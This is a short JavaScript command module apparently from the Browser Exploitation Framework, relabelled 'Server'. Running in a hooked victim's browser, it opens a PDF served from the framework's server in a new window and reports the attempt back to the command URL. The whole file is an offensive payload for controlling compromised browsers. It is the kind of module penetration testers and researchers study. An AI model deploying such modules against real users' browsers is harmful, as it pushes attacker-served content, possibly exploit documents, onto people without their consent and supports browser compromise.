//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	
	var pdf_url =  server.net.httpproto + '://'+server.net.host+ ':' + server.net.port + '/report.pdf';
	window.open( pdf_url, '_blank');

    server.net.send('<%= @command_url %>', <%= @command_id %>, "Attempted to open PDF in default browser.");
});
